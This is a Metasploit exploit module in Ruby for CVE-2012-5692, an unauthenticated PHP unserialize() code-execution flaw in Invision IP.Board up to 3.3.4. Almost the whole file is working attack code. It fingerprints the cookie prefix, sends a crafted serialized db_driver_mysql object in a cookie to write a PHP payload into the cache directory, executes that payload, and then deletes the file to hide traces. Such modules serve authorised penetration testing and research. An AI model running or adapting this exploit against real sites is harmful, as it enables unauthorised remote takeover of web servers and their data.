##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Invision IP.Board unserialize() PHP Code Execution',
      'Description'    => %q{
          This module exploits a php unserialize() vulnerability in Invision IP.Board
        <= 3.3.4 which could be abused to allow unauthenticated users to execute arbitrary
        code under the context of the webserver user.

        The dangerous unserialize() exists in the '/admin/sources/base/core.php' script,
        which is called with user controlled data from the cookie. The exploit abuses the
        __destruct() method from the dbMain class to write arbitrary PHP code to a file on
        the Invision IP.Board web directory.

        The exploit has been tested successfully on Invision IP.Board 3.3.4.
      },
      'Author'         =>
        [
          'EgiX',         # Vulnerability discovery, PoC, work on check() and cookie_prefix() methods
          'juan vazquez', # Metasploit module
          'sinn3r'        # PhpEXE tekniq & check() method
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-5692' ],
          [ 'OSVDB', '86702' ],
          [ 'BID', '56288' ],
          [ 'EDB', '22398' ],
          [ 'URL', 'http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-critical-security-update/' ]
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Payload'        =>
        {
          'Space'       => 8000, #Apache's limit for GET
          'DisableNops' => true
        },
      'Targets'        => [ ['Invision IP.Board 3.3.4', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 25 2012'
      ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "The base path to the web application", "/forums/"])
      ])

    self.needs_cleanup = true
  end

  def base
    base = target_uri.path
    base << '/' if base[-1, 1] != '/'
    return base
  end

  def cookie_prefix
    print_status("Checking for cookie prefix")
    cookie_prefix = ""
    res = send_request_cgi(
      {
        'uri' => "#{base}index.php",
        'method' => 'GET'
      })

    if res and res.code == 200 and res.get_cookies =~ /(.+)session/
      print_status("Cookie prefix #{$1} found")
      cookie_prefix = $1
    end
    return cookie_prefix
  end

  def check
    check_str = Rex::Text.uri_encode('a:1:{i:0;O:1:"x":0:{}}')
    res = send_request_cgi(
      {
        'uri' => "#{base}index.php",
        'method' => 'GET',
        'cookie' => "#{cookie_prefix}session_id=#{check_str}"
      })

    if res and res.code == 500 or res.body =~ /PHP_Incomplete_Class/
      return Exploit::CheckCode::Vulnerable
    elsif res and res.code == 200
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def on_new_session(client)
    if client.type == "meterpreter"
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      begin
        print_warning("Deleting #{@upload_php}")
        client.fs.file.rm(@upload_php)
        print_good("#{@upload_php} removed to stay ninja")
      rescue
        print_error("Unable to remove #{f}")
      end
    end
  end

  def exploit
    @upload_php = rand_text_alpha(rand(4) + 4) + ".php"

    # get_write_exec_payload uses a function, which limits our ability to support
    # Linux payloads, because that requires a space:
    #   function my_cmd
    # becomes:
    #   functionmy_cmd #Causes parsing error
    # We'll have to address that in the mixin, and then come back to this module
    # again later.
    php_payload = get_write_exec_payload(:unlink_self=>true)
    php_payload = php_payload.gsub(/^\<\?php/, '<?')
    php_payload = php_payload.gsub(/ /,'')

    db_driver_mysql = "a:1:{i:0;O:15:\"db_driver_mysql\":1:{s:3:\"obj\";a:2:{s:13:\"use_debug_log\";i:1;s:9:\"debug_log\";s:#{"cache/#{@upload_php}".length}:\"cache/#{@upload_php}\";}}}"

    print_status("Exploiting the unserialize() to upload PHP code")

    res = send_request_cgi(
    {
      'uri' => "#{base}index.php?#{php_payload}",
      'method' => 'GET',
      'cookie' => "#{cookie_prefix}member_id=#{Rex::Text.uri_encode(db_driver_mysql)}"
    })

    if not res or res.code != 200
      print_error("Exploit failed: #{res.code}")
      return
    end

    print_status("Executing the payload #{@upload_php}")

    res = send_request_raw({'uri' => "#{base}cache/#{@upload_php}"})

    if res
      print_error("Payload execution failed: #{res.code}")
      return
    end

  end
end
